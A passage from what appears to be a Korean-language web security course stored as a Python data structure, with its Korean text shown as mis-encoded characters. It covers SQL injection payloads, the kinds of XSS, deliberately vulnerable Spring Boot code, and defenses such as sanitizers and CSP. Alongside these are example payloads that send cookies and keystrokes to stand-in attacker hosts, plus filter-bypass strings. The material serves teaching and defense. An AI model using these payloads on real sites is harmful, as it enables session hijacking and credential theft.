ë°©ì–´í•©ë‹ˆë‹¤.\n\nQ: Blind SQL Injection ë°©ì–´ ë°©ë²•ì€?\nA: PreparedStatement ì‚¬ìš©ì´ ê·¼ë³¸ì  í•´ê²°ì±….\n   ì¶”ê°€ë¡œ ì‘ë‹µ ì‹œê°„ ì¼ì •í™”, ì—ëŸ¬ ë©”ì‹œì§€ í‘œì¤€í™”,\n   WAF íŒ¨í„´ íƒì§€ë¥¼ ì ìš©í•©ë‹ˆë‹¤.\n```\n\n### í…ŒìŠ¤íŠ¸ í˜ì´ë¡œë“œ ì˜ˆì‹œ\n\n```\n# ê¸°ë³¸ í…ŒìŠ¤íŠ¸\n' OR '1'='1\n\" OR \"1\"=\"1\nadmin'--\nadmin' #\n\n# UNION ê¸°ë°˜\n' UNION SELECT null--\n' UNION SELECT 1,2,3--\n' UNION SELECT username, password FROM users--\n\n# Time-based Blind\n' AND SLEEP(5)--\n' AND (SELECT SLEEP(5))--\n\n# Error-based\n' AND 1=CONVERT(int, @@version)--\n' AND extractvalue(1, concat(0x7e, version()))--\n```"
            }
        ]
    },

    # ===========================================
    # 02_ê³µê²© ì„¹ì…˜ - XSS (Cross-Site Scripting)
    # ===========================================
    "02_ê³µê²©/xss": {
        "title": "XSS ê³µê²© ì›ë¦¬",
        "description": "Cross-Site Scripting(XSS) ê³µê²©ì˜ ì›ë¦¬ì™€ ìœ í˜•ì„ í•™ìŠµí•©ë‹ˆë‹¤.",
        "sections": [
            {
                "type": "concept",
                "title": "ğŸ¯ XSS ê³µê²© ì™„ì „ ì •ë³µ",
                "content": "## í•œ ì¤„ ìš”ì•½\n> **ì›¹ í˜ì´ì§€ì— ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì£¼ì…í•˜ëŠ” ê³µê²©** - ì‚¬ìš©ì ë¸Œë¼ìš°ì €ë¥¼ ì¥ì•…í•˜ëŠ” ê³µê²©!\n\n---\n\n## ğŸ’¡ ë¹„ìœ ë¡œ ì´í•´í•˜ê¸°\n\n```\nğŸ“ ê²Œì‹œíŒì— ë¹„ìœ í•˜ë©´:\n\nì •ìƒ ìƒí™©:\nì‚¬ìš©ì: \"ì¢‹ì€ ê¸€ì´ë„¤ìš”!\" ëŒ“ê¸€ ì‘ì„±\në‹¤ë¥¸ ì‚¬ìš©ì: \"ì¢‹ì€ ê¸€ì´ë„¤ìš”!\" í…ìŠ¤íŠ¸ ë³´ì„\n\nXSS ê³µê²©:\ní•´ì»¤: \"<script>document.location='http://í•´ì»¤.com/steal?'+document.cookie</script>\" ëŒ“ê¸€ ì‘ì„±\në‹¤ë¥¸ ì‚¬ìš©ì: (ë¹ˆ í™”ë©´... í•˜ì§€ë§Œ ì¿ í‚¤ê°€ í•´ì»¤ì—ê²Œ ì „ì†¡ë¨!)\n\nê²°ê³¼:\ní•´ì»¤: í”¼í•´ìì˜ ì„¸ì…˜ ì¿ í‚¤ íƒˆì·¨\ní•´ì»¤: í”¼í•´ì ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸ ì„±ê³µ!\n```\n\n---\n\n## ğŸš¨ ì™œ ì•Œì•„ì•¼ í•˜ë‚˜? - ì‹¤ì œ í•´í‚¹ ì‚¬ê³ \n\n### ëŒ€í‘œì  ì‚¬ë¡€:\n```\nğŸ“Œ 2018ë…„ British Airways í•´í‚¹\nì›ì¸: ê²°ì œ í˜ì´ì§€ì— ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì‚½ì…\ní”¼í•´: 38ë§Œ ê³ ê° ì¹´ë“œ ì •ë³´ ìœ ì¶œ, $2.3ì–µ ë²Œê¸ˆ\n\nğŸ“Œ 2019ë…„ Fortnite (ì—í”½ê²Œì„ì¦ˆ)\nì›ì¸: Stored XSSë¡œ ì„¸ì…˜ íƒˆì·¨\ní”¼í•´: 8,000ë§Œ+ ê³„ì • í•´í‚¹ ìœ„í—˜ ë…¸ì¶œ\n\nğŸ“Œ 2021ë…„ eBay ì·¨ì•½ì  ë°œê²¬\nì›ì¸: ê²€ìƒ‰ì°½ Reflected XSS\ní”¼í•´: ì ì¬ì  ê³„ì • íƒˆì·¨ ìœ„í—˜ (ë²„ê·¸ë°”ìš´í‹°ë¡œ í•´ê²°)\n```\n\n### XSS ìœ í˜•ë³„ ìœ„í—˜ë„:\n```\nğŸ”´ Stored XSS (ì €ì¥í˜•): ë§¤ìš° ìœ„í—˜\n   â””â”€â”€ DBì— ì €ì¥ë˜ì–´ ëª¨ë“  ë°©ë¬¸ìì—ê²Œ ì‹¤í–‰\n   \nğŸŸ  Reflected XSS (ë°˜ì‚¬í˜•): ìœ„í—˜\n   â””â”€â”€ URL íŒŒë¼ë¯¸í„°ë¥¼ í†µí•´ ì¦‰ì‹œ ì‹¤í–‰\n   \nğŸŸ¡ DOM-based XSS: ìœ„í—˜\n   â””â”€â”€ í´ë¼ì´ì–¸íŠ¸ ì¸¡ JavaScriptì—ì„œ ë°œìƒ\n```"
            },
            {
                "type": "code",
                "title": "ğŸ’» ê³µê²© ì›ë¦¬ì™€ ì·¨ì•½í•œ ì½”ë“œ",
                "content": "### XSS ê³µê²© íë¦„ë„\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    Stored XSS ê³µê²© íë¦„                          â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                                 â”‚\nâ”‚   [í•´ì»¤]                                                        â”‚\nâ”‚     â”‚                                                           â”‚\nâ”‚     â”‚ 1. ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ í¬í•¨ ê²Œì‹œê¸€ ì‘ì„±                          â”‚\nâ”‚     â”‚    <script>fetch('http://í•´ì»¤.com/steal?c='+document.cookie)</script>\nâ”‚     â–¼                                                           â”‚\nâ”‚   [ì›¹ ì„œë²„]                                                      â”‚\nâ”‚     â”‚                                                           â”‚\nâ”‚     â”‚ 2. ê²€ì¦ ì—†ì´ DBì— ì €ì¥                                    â”‚\nâ”‚     â–¼                                                           â”‚\nâ”‚   [ë°ì´í„°ë² ì´ìŠ¤]                                                  â”‚\nâ”‚     â”‚                                                           â”‚\nâ”‚     â”‚ 3. ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì €ì¥ë¨                                    â”‚\nâ”‚     â”‚                                                           â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                                 â”‚\nâ”‚   [í”¼í•´ì]                                                       â”‚\nâ”‚     â”‚                                                           â”‚\nâ”‚     â”‚ 4. ê²Œì‹œê¸€ ì—´ëŒ ìš”ì²­                                        â”‚\nâ”‚     â–¼                                                           â”‚\nâ”‚   [ì›¹ ì„œë²„]                                                      â”‚\nâ”‚     â”‚                                                           â”‚\nâ”‚     â”‚ 5. ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ í¬í•¨ HTML ë°˜í™˜                            â”‚\nâ”‚     â–¼                                                           â”‚\nâ”‚   [í”¼í•´ì ë¸Œë¼ìš°ì €]                                               â”‚\nâ”‚     â”‚                                                           â”‚\nâ”‚     â”‚ 6. ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ â†’ ì¿ í‚¤ íƒˆì·¨!                              â”‚\nâ”‚     â–¼                                                           â”‚\nâ”‚   [í•´ì»¤ ì„œë²„: ì¿ í‚¤ ìˆ˜ì‹ , ì„¸ì…˜ í•˜ì´ì¬í‚¹ ì„±ê³µ]                       â”‚\nâ”‚                                                                 â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n### ì·¨ì•½í•œ ì½”ë“œ ì˜ˆì‹œ (Java Spring Boot)\n\n```java\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// âŒ ì·¨ì•½í•œ ì½”ë“œ #1: Stored XSS (ì €ì¥í˜•)\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@RestController\n@RequestMapping(\"/api/posts\")\npublic class VulnerablePostController {\n    \n    // ğŸš¨ ìœ„í—˜! ì‚¬ìš©ì ì…ë ¥ì„ ê²€ì¦ ì—†ì´ ì €ì¥\n    @PostMapping\n    public Post createPost(@RequestBody PostRequest request) {\n        Post post = new Post();\n        post.setTitle(request.getTitle());    // XSS í˜ì´ë¡œë“œ ì €ì¥ë¨!\n        post.setContent(request.getContent()); // <script>...</script>\n        return postRepository.save(post);\n    }\n}\n\n// ğŸš¨ ìœ„í—˜! Thymeleafì—ì„œ unescaped ì¶œë ¥\n// templates/post.html\n// <div th:utext=\"${post.content}\"></div>  <!-- th:utextëŠ” ì´ìŠ¤ì¼€ì´í”„ ì•ˆí•¨! -->\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// âŒ ì·¨ì•½í•œ ì½”ë“œ #2: Reflected XSS (ë°˜ì‚¬í˜•)\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@GetMapping(\"/search\")\npublic String search(@RequestParam String keyword, Model model) {\n    model.addAttribute(\"keyword\", keyword);  // ê²€ì¦ ì—†ì´ ì „ë‹¬\n    // URL: /search?keyword=<script>alert('XSS')</script>\n    return \"search-result\";\n}\n\n// ğŸš¨ ìœ„í—˜! í…œí”Œë¦¿ì—ì„œ ì§ì ‘ ì¶œë ¥\n// <p>ê²€ìƒ‰ì–´: <span th:utext=\"${keyword}\"></span></p>\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// âŒ ì·¨ì•½í•œ ì½”ë“œ #3: DOM-based XSS\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// í”„ë¡ íŠ¸ì—”ë“œ JavaScript\n// const urlParams = new URLSearchParams(window.location.search);\n// const name = urlParams.get('name');\n// document.getElementById('greeting').innerHTML = 'Hello, ' + name;\n// URL: /page?name=<img src=x onerror=alert('XSS')>\n```\n\n### XSS ê³µê²© í˜ì´ë¡œë“œ ìœ í˜•\n\n```html\n<!-- ê¸°ë³¸ ìŠ¤í¬ë¦½íŠ¸ ì‚½ì… -->\n<script>alert('XSS')</script>\n\n<!-- ì¿ í‚¤ íƒˆì·¨ -->\n<script>\n  new Image().src='http://attacker.com/steal?c='+document.cookie;\n</script>\n\n<!-- í‚¤ë¡œê±° -->\n<script>\n  document.addEventListener('keypress', function(e) {\n    fetch('http://attacker.com/log?key=' + e.key);\n  });\n</script>\n\n<!-- ì´ë²¤íŠ¸ í•¸ë“¤ëŸ¬ ì´ìš© -->\n<img src=x onerror=\"alert('XSS')\">\n<body onload=\"alert('XSS')\">\n<svg onload=\"alert('XSS')\">\n\n<!-- í•„í„° ìš°íšŒ -->\n<ScRiPt>alert('XSS')</ScRiPt>  <!-- ëŒ€ì†Œë¬¸ì í˜¼í•© -->\n<script>alert(String.fromCharCode(88,83,83))</script>  <!-- ì¸ì½”ë”© -->\n<img src=x onerror=alert`XSS`>  <!-- ë°±í‹± ì‚¬ìš© -->\n```"
            },
            {
                "type": "code",
                "title": "ğŸ›¡ï¸ ë°©ì–´ ì½”ë“œì™€ ì‹¤ì „",
                "content": "### ì•ˆì „í•œ ì½”ë“œ (Java Spring Boot 3.x)\n\n```java\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// âœ… ë°©ì–´ ë°©ë²• 1: ì¶œë ¥ ì‹œ ì´ìŠ¤ì¼€ì´í”„ (ê¸°ë³¸ ë°©ì–´)\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n// Thymeleaf - th:textëŠ” ìë™ ì´ìŠ¤ì¼€ì´í”„\n// templates/post.html\n// <div th:text=\"${post.content}\"></div>  <!-- ìë™ ì´ìŠ¤ì¼€ì´í”„ -->\n// ê²°ê³¼: &lt;script&gt;alert('XSS')&lt;/script&gt;\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// âœ… ë°©ì–´ ë°©ë²• 2: ì…ë ¥ ì‹œ ê²€ì¦ + ì •í™”\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@Service\npublic class XssSanitizer {\n    \n    // OWASP Java HTML Sanitizer ì‚¬ìš©\n    private static final PolicyFactory POLICY = new HtmlPolicyBuilder()\n        .allowElements(\"p\", \"br\", \"b\", \"i\", \"u\", \"strong\", \"em\")  // í—ˆìš© íƒœê·¸ë§Œ\n        .allowUrlProtocols(\"https\")  // httpsë§Œ í—ˆìš©\n        .allowAttributes(\"href\").onElements(\"a\")\n        .requireRelNofollowOnLinks()\n        .toFactory();\n    \n    public String sanitize(String untrusted) {\n        return POLICY.sanitize(untrusted);\n    }\n}\n\n@RestController\n@RequestMapping(\"/api/posts\")\npublic class SecurePostController {\n    \n    @Autowired\n    private XssSanitizer sanitizer;\n    \n    @PostMapping\n    public Post createPost(@Valid @RequestBody PostRequest request) {\n        Post post = new Post();\n        post.setTitle(sanitizer.sanitize(request.getTitle()));\n        post.setContent(sanitizer.sanitize(request.getContent()));\n        return postRepository.save(post);\n    }\n}\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// âœ… ë°©ì–´ ë°©ë²• 3: CSP (Content Security Policy) í—¤ë”\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n    \n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .headers(headers -> headers\n                .contentSecurityPolicy(csp -> csp\n                    .policyDirectives(\n                        \"default-src 'self'; \" +\n                        \"script-src 'self' 'nonce-{random}'; \" +  // ì¸ë¼ì¸ ìŠ¤í¬ë¦½íŠ¸ ì°¨ë‹¨\n                        \"style-src 'self' 'unsafe-inline'; \" +\n                        \"img-src 'self' data: https:; \" +\n                        \"frame-ancestors 'none'; \" +  // Clickjacking ë°©ì§€\n                        \"form-action 'self';\"\n                    )\n                )\n                .xssProtection(xss -> xss.disable())  // CSPë¡œ ëŒ€ì²´\n            );\n        return http.build();\n    }\n}\n```\n\n### ë°©ì–´ ì›ë¦¬ ì„¤ëª…\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    XSS ë°©ì–´ 3ë‹¨ê³„                                â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                                 â”‚\nâ”‚   1ë‹¨ê³„: ì…ë ¥ ê²€ì¦ (Input Validation)                            â”‚\nâ”‚   â”œâ”€â”€ í—ˆìš©ëœ ë¬¸ìë§Œ ì…ë ¥ í—ˆìš©                                     â”‚\nâ”‚   â”œâ”€â”€ HTML íƒœê·¸ í•„í„°ë§/ì •í™”                                       â”‚\nâ”‚   â””â”€â”€ ê¸¸ì´ ì œí•œ                                                  â”‚\nâ”‚                                                                 â”‚\nâ”‚   2ë‹¨ê³„: ì¶œë ¥ ì´ìŠ¤ì¼€ì´í”„ (Output Encoding)                        â”‚\nâ”‚   â”œâ”€â”€ HTML Context: &lt; &gt; &amp; &quot;                        â”‚\nâ”‚   â”œâ”€â”€ JavaScript Context: \\x3c \\x3e                             â”‚\nâ”‚   â”œâ”€â”€ URL Context: %3C %3E                                      â”‚\nâ”‚   â””â”€â”€ CSS Context: \\3c \\3e                                      â”‚\nâ”‚                                                                 â”‚\nâ”‚   3ë‹¨ê³„: CSP (Content Security Policy)                           â”‚\nâ”‚   â”œâ”€â”€ ì¸ë¼ì¸ ìŠ¤í¬ë¦½íŠ¸ ì°¨ë‹¨                                        â”‚\nâ”‚   â”œâ”€â”€ í—ˆìš©ëœ ë„ë©”ì¸ë§Œ ìŠ¤í¬ë¦½íŠ¸ ë¡œë“œ                                â”‚\nâ”‚   â””â”€â”€ ìµœí›„ì˜ ë°©ì–´ì„                                                â”‚\nâ”‚                                                                 â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```"
            },
            {
                "type": "tip",
                "title": "ğŸ’¡ ì‹¤ë¬´ ì²´í¬ë¦¬ìŠ¤íŠ¸ & ë©´ì ‘",
                "content": "### ì‹¤ë¬´ ì²´í¬ë¦¬ìŠ¤íŠ¸\n\n```\n[ í”„ë¡ íŠ¸ì—”ë“œ ]\nâ–¡ innerHTML ì‚¬ìš© ê¸ˆì§€ â†’ textContent ì‚¬ìš©\nâ–¡ eval(), document.write() ì‚¬ìš© ê¸ˆì§€\nâ–¡ URL íŒŒë¼ë¯¸í„° ì§ì ‘ DOM ì‚½ì… ê¸ˆì§€\nâ–¡ React/Vueì˜ ìë™ ì´ìŠ¤ì¼€ì´í”„ í™œìš©\nâ–¡ dangerouslySetInnerHTML ì‚¬ìš© ì‹œ sanitize\n\n[ ë°±ì—”ë“œ ]\nâ–¡ ì¶œë ¥ ì‹œ ì»¨í…ìŠ¤íŠ¸ë³„ ì´ìŠ¤ì¼€ì´í”„\nâ–¡ í…œí”Œë¦¿ ì—”ì§„ ìë™ ì´ìŠ¤ì¼€ì´í”„ í™•ì¸\nâ–¡ HTML í—ˆìš© í•„ë“œëŠ” sanitizer ì ìš©\nâ–¡ CSP í—¤ë” ì„¤ì •\nâ–¡ X-Content-Type-Options: nosniff\n\n[ í…ŒìŠ¤íŠ¸ ]\nâ–¡ ê¸°ë³¸ XSS í˜ì´ë¡œë“œ í…ŒìŠ¤íŠ¸\nâ–¡ ì¸ì½”ë”© ìš°íšŒ í˜ì´ë¡œë“œ í…ŒìŠ¤íŠ¸\nâ–¡ ìë™í™” ìŠ¤ìºë„ˆ (Burp Suite, OWASP ZAP)\n```\n\n### ë©´ì ‘ ì˜ˆìƒ ì§ˆë¬¸\n\n```\nğŸ‘¶ ì£¼ë‹ˆì–´ ë ˆë²¨:\nQ: XSS ê³µê²©ì´ ë¬´ì—‡ì¸ê°€ìš”?\nA: ì›¹ í˜ì´ì§€ì— ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì£¼ì…í•˜ì—¬ ë‹¤ë¥¸ ì‚¬ìš©ìì˜\n   ë¸Œë¼ìš°ì €ì—ì„œ ì‹¤í–‰ë˜ê²Œ í•˜ëŠ” ê³µê²©ì…ë‹ˆë‹¤.\n   ì¿ í‚¤ íƒˆì·¨, í”¼ì‹±, ì•…ì„±ì½”ë“œ ë°°í¬ì— ì‚¬ìš©ë©ë‹ˆë‹¤.\n\nQ: XSS ìœ í˜• 3ê°€ì§€ë¥¼ ì„¤ëª…í•´ì£¼ì„¸ìš”.\nA: Stored XSSëŠ” ì„œë²„ì— ì €ì¥ë˜ì–´ ì§€ì†ì ìœ¼ë¡œ ì‹¤í–‰,\n   Reflected XSSëŠ” URL íŒŒë¼ë¯¸í„°ë¡œ ì¦‰ì‹œ ë°˜ì‚¬,\n   DOM-based XSSëŠ” í´ë¼ì´ì–¸íŠ¸ JavaScriptì—ì„œ ë°œìƒí•©ë‹ˆë‹¤.\n\nğŸ‘¨â€ğŸ’¼ ì‹œë‹ˆì–´ ë ˆë²¨:\nQ: CSPê°€ XSSë¥¼ ì–´ë–»ê²Œ ë°©ì–´í•˜ë‚˜ìš”?\nA: ì¸ë¼ì¸ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì°¨ë‹¨í•˜ê³  í—ˆìš©ëœ ë„ë©”ì¸ì˜ ìŠ¤í¬ë¦½íŠ¸ë§Œ\n   ì‹¤í–‰í•˜ê²Œ í•©ë‹ˆë‹¤. nonceë‚˜ hashë¥¼ ì‚¬ìš©í•˜ì—¬ í—ˆìš©ëœ\n   ìŠ¤í¬ë¦½íŠ¸ë§Œ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\n\nQ: Reactì—ì„œ XSSê°€ ë°œìƒí•  ìˆ˜ ìˆë‚˜ìš”?\nA: ê¸°ë³¸ì ìœ¼ë¡œ JSXëŠ” ìë™ ì´ìŠ¤ì¼€ì´í”„ë˜ì–´ ì•ˆì „í•©ë‹ˆë‹¤.\n   í•˜ì§€ë§Œ dangerouslySetInnerHTML, hrefì— javascript:,\n   ì„œë²„ ì‚¬ì´ë“œ ë Œë”ë§ ì‹œ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\n```\n\n### ë” ê³µë¶€í•  ìë£Œ\n\n```\nğŸ“š ê³µì‹ ë¬¸ì„œ:\n- OWASP XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html\n- MDN CSP: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\n- CWE-79: XSS\n\nğŸ”§ ë„êµ¬:\n- OWASP ZAP: ì›¹ ì·¨ì•½ì  ìŠ¤ìºë„ˆ\n- Burp Suite: í”„ë¡ì‹œ ë„êµ¬\n- XSS Hunter: XSS íƒì§€ ë„êµ¬\n\nğŸ“Š ì‹¤ìŠµ:\n- PortSwigger Web Security Academy: XSS Labs\n- OWASP WebGoat: XSS ì‹¤ìŠµ\n- Google XSS Game\n```"
            }
        ]
    },

    "02_ê³µê²©/xss-prevent": {
        "title": "XSS ë°©ì–´ ì™„ë²½ ê°€ì´ë“œ",
        "description": "XSS ê³µê²©ì— ëŒ€í•œ ë‹¤ì¸µ ë°©ì–´ ì „ëµì„ í•™ìŠµí•©ë‹ˆë‹¤.",
        "sections": [
            {
                "type": "concept",
                "title": "ğŸ¯ XSS ë°©ì–´ ì™„ì „ ì •ë³µ",
                "content": "## í•œ ì¤„ ìš”ì•½\n> **ì…ë ¥ ê²€ì¦ + ì¶œë ¥ ì¸ì½”ë”© + CSP** - ì„¸ ê°€ì§€ ë°©ì–´ì„ ìœ¼ë¡œ XSSë¥¼ ì›ì²œ ì°¨ë‹¨!\n\n---\n\n## ğŸ’¡ ë¹„ìœ ë¡œ ì´í•´í•˜ê¸°\n\n```\nğŸ¥ ë³‘ì› ê°ì—¼ ê´€ë¦¬ì— ë¹„ìœ í•˜ë©´:\n\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚           XSS ë°©ì–´ 3ë‹¨ê³„                 â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                         â”‚\nâ”‚   1ë‹¨ê³„: ì…êµ¬ ê²€ì‚¬ (ì…ë ¥ ê²€ì¦)            â”‚\nâ”‚          â””â”€â”€ ì˜ì‹¬ ì¦ìƒì ì…ì¥ ì œí•œ        â”‚\nâ”‚          â””â”€â”€ ìœ„í—˜ ë¬¸ì í•„í„°ë§             â”‚\nâ”‚                                         â”‚\nâ”‚   2ë‹¨ê³„: ì†Œë… (ì¶œë ¥ ì¸ì½”ë”©)               â”‚\nâ”‚          â””â”€â”€ ëª¨ë“  ê²ƒì„ ì†Œë… ì²˜ë¦¬          â”‚\nâ”‚          â””â”€â”€ íŠ¹ìˆ˜ë¬¸ì ë¬´ë ¥í™”              â”‚\nâ”‚                                         â”‚\nâ”‚   3ë‹¨ê³„: ë³´í˜¸ë³µ (CSP)                    â”‚\nâ”‚          â””â”€â”€ ë§ˆì§€ë§‰ ë°©ì–´ë§‰                â”‚\nâ”‚          â””â”€â”€ í˜¹ì‹œ ëª¨ë¥¼ ê°ì—¼ ì°¨ë‹¨          â”‚\nâ”‚                                         â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n---\n\n## ğŸš¨ ë°©ì–´ ì‹¤íŒ¨ì—ì„œ ë°°ìš°ê¸°\n\n### ë°©ì–´ê°€ ëš«ë¦° ì‚¬ë¡€:\n```\nğŸ“Œ 2018ë…„ Magecart ê³µê²©\nì‹¤íŒ¨ ì›ì¸: ì„œë“œíŒŒí‹° ìŠ¤í¬ë¦½íŠ¸ ê´€ë¦¬ ë¯¸í¡\nêµí›ˆ: CSPë¡œ ì™¸ë¶€ ìŠ¤í¬ë¦½íŠ¸ ì œì–´ í•„ìš”\n\nğŸ“Œ 2020ë…„ Twitter XSS\nì‹¤íŒ¨ ì›ì¸: ëª¨ë°”ì¼ ì•±ì—ì„œ ì…ë ¥ ê²€ì¦ ëˆ„ë½\nêµí›ˆ: ëª¨ë“  ì…ë ¥ ì±„ë„ì—ì„œ ê²€ì¦ í•„ìš”\n```\n\n### ë°©ì–´ ì„±ê³µ ì‚¬ë¡€:\n```\nğŸ“Œ Gmail CSP ì ìš©\nì„±ê³µ ìš”ì¸: ì—„ê²©í•œ CSP + nonce ê¸°ë°˜ ìŠ¤í¬ë¦½íŠ¸\nê²°ê³¼: XSS ê³µê²© ê±°ì˜ ë¶ˆê°€ëŠ¥\n```"
            },
            {
                "type": "code",
                "title": "ğŸ’» ë‹¤ì¸µ ë°©ì–´ êµ¬í˜„",
